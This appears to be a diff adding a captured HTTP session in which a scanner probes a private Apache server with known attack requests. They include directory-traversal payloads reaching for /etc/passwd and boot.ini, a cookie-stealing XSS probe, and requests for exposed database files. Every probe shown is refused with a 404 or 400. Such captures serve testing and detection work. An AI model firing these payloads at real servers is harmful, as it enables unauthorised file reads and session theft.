@@ -1,0 +1,198 @@
+GET /bytehoard/index.php?infolder=../../../../../../../../../../../etc/ HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36
+Connection: Keep-Alive
+Host: 192.168.20.12
+
+HTTP/1.1 404 Not Found
+Date: Tue, 05 Aug 2025 20:55:52 GMT
+Server: Apache/2.4.62 (Debian)
+Content-Length: 275
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+<hr>
+<address>Apache/2.4.62 (Debian) Server at 192.168.20.12 Port 80</address>
+</body></html>
+GET /Search HTTP/1.1
+Host: 192.168.20.12
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36
+Connection: Keep-Alive
+
+HTTP/1.1 404 Not Found
+Date: Tue, 05 Aug 2025 20:55:52 GMT
+Server: Apache/2.4.62 (Debian)
+Content-Length: 275
+Keep-Alive: timeout=5, max=99
+Connection: Keep-Alive
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+<hr>
+<address>Apache/2.4.62 (Debian) Server at 192.168.20.12 Port 80</address>
+</body></html>
+GET /musicqueue.cgi HTTP/1.1
+Host: 192.168.20.12
+Connection: Keep-Alive
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36
+
+HTTP/1.1 404 Not Found
+Date: Tue, 05 Aug 2025 20:55:52 GMT
+Server: Apache/2.4.62 (Debian)
+Content-Length: 275
+Keep-Alive: timeout=5, max=98
+Connection: Keep-Alive
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+<hr>
+<address>Apache/2.4.62 (Debian) Server at 192.168.20.12 Port 80</address>
+</body></html>
+GET /scripts/tools/newdsn.exe HTTP/1.1
+Host: 192.168.20.12
+Connection: Keep-Alive
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36
+
+HTTP/1.1 404 Not Found
+Date: Tue, 05 Aug 2025 20:55:52 GMT
+Server: Apache/2.4.62 (Debian)
+Content-Length: 275
+Keep-Alive: timeout=5, max=97
+Connection: Keep-Alive
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+<hr>
+<address>Apache/2.4.62 (Debian) Server at 192.168.20.12 Port 80</address>
+</body></html>
+GET /OpenFile.aspx?file=../../../../../../../../../../boot.ini HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36
+Connection: Keep-Alive
+Host: 192.168.20.12
+
+HTTP/1.1 404 Not Found
+Date: Tue, 05 Aug 2025 20:55:52 GMT
+Server: Apache/2.4.62 (Debian)
+Content-Length: 275
+Keep-Alive: timeout=5, max=96
+Connection: Keep-Alive
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+<hr>
+<address>Apache/2.4.62 (Debian) Server at 192.168.20.12 Port 80</address>
+</body></html>
+GET /index.php?vo=\"><script>alert(document.cookie);</script> HTTP/1.1
+Host: 192.168.20.12
+Connection: Keep-Alive
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36
+
+HTTP/1.1 404 Not Found
+Date: Tue, 05 Aug 2025 20:55:52 GMT
+Server: Apache/2.4.62 (Debian)
+Content-Length: 275
+Keep-Alive: timeout=5, max=95
+Connection: Keep-Alive
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+<hr>
+<address>Apache/2.4.62 (Debian) Server at 192.168.20.12 Port 80</address>
+</body></html>
+GET /.../.../.../.../.../.../.../.../.../.../etc/passwd HTTP/1.1
+Connection: Keep-Alive
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36
+Host: 192.168.20.12
+
+HTTP/1.1 404 Not Found
+Date: Tue, 05 Aug 2025 20:55:52 GMT
+Server: Apache/2.4.62 (Debian)
+Content-Length: 275
+Keep-Alive: timeout=5, max=94
+Connection: Keep-Alive
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+<hr>
+<address>Apache/2.4.62 (Debian) Server at 192.168.20.12 Port 80</address>
+</body></html>
+GET /admin/database/wwForum.mdb HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36
+Connection: Keep-Alive
+Host: 192.168.20.12
+
+HTTP/1.1 404 Not Found
+Date: Tue, 05 Aug 2025 20:55:52 GMT
+Server: Apache/2.4.62 (Debian)
+Content-Length: 275
+Keep-Alive: timeout=5, max=93
+Connection: Keep-Alive
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+<hr>
+<address>Apache/2.4.62 (Debian) Server at 192.168.20.12 Port 80</address>
+</body></html>
+GET /../config.dat HTTP/1.1
+Connection: Keep-Alive
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36
+Host: 192.168.20.12
+
+HTTP/1.1 400 Bad Request
+Date: Tue, 05 Aug 2025 20:55:52 GMT
+Server: Apache/2.4.62 (Debian)
+Content-Length: 305
+Connection: close
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>400 Bad Request</title>
+</head><body>
+<h1>Bad Request</h1>
+<p>Your browser sent a request that this server could not understand.<br />
+</p>
+<hr>
+<address>Apache/2.4.62 (Debian) Server at 192.168.20.12 Port 80</address>
+</body></html>
